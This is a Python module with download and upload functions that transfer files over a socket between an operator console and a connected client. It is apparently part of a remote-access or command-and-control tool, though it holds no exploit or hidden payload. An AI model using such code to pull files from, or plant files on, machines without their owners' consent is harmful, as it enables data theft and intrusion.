from src.ui.colors import Colors as cl
from src.utils.net_io import send, recv, recvall
from src.utils.file_dialog import open_file, save_file
import os

def download(cl_socket, cmd):
    try:
        save_dir = save_file()
        print(f"{cl.cyan}[*] File will be saved at: {save_dir}{cl.reset}")
        send(cl_socket, cmd)
        file_name_data = recv(cl_socket)
        if file_name_data and file_name_data.decode().startswith("FILE_NAME:"):
           file_name = file_name_data.decode()[len("FILE_NAME:"):].strip()
           print("client filename", file_name)
        data = recv(cl_socket)
        if data.startswith(b"ERROR"):
            print(data.decode())
        else:
            full_save_path = os.path.normpath(os.path.join(save_dir, file_name))
            with open(full_save_path, "wb") as f:
                f.write(data)
            print(f"{cl.green}[+] File downloaded{cl.reset}")

    except Exception as e:
        print(f"{cl.red}Download error: {e}{cl.reset}")


def upload(cl_socket, cmd):
    """Upload a file to the client"""
    file_path, file_name = open_file()
    cmd = f"{cmd} {file_name}"
    send(cl_socket, cmd.encode())
    try:
        send(cl_socket, b"$up:start~+")
        print(f"{cl.yellow}[^] Uploading '{file_name}' to the client...{cl.reset}")
        with open(file_path,"rb") as file_up:
          for data in iter(lambda: file_up.read(4096), b""):
            try:
              send(cl_socket, data)
            except:
              file_up.close()
              send(cl_socket, b"up:aborted+*~")
        send(cl_socket, b"up:done+*<+")
        response = recv(cl_socket).decode()
        print(f"{cl.yellow}[*] Client response: {response}{cl.reset}")
        if not "error" in response.lower():
            print(f"{cl.green}[+] Upload successfull!{cl.reset}")
            return
    except Exception as e:
        print(f"{cl.red}[!] File upload error: {e}{cl.reset}")
        send(cl_socket, b"up:aborted+*~")